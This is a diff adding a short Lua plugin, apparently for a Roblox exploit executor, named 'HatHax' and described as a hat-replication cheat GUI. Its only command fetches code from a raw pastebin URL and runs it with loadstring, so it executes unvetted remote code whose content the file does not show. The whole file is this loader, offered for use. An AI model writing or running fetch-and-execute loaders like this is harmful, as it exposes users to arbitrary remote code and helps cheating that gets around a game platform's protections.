@@ -1,0 +1,16 @@
+local Plugin = {
+    ["PluginName"] = "HatHax",
+    ["PluginDescription"] = "FE Hat Replication GUI",
+    ["Commands"] = {
+        ["HatHax"] = {
+            ["ListName"] = "HatHax",
+            ["Description"] = "Gives you Hat Replication GUI",
+            ["Aliases"] = {""},
+            ["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("http://pastebin.com/raw/ygwcfXck", true))()
+            end     
+        },
+    }
+}
+
+return Plugin
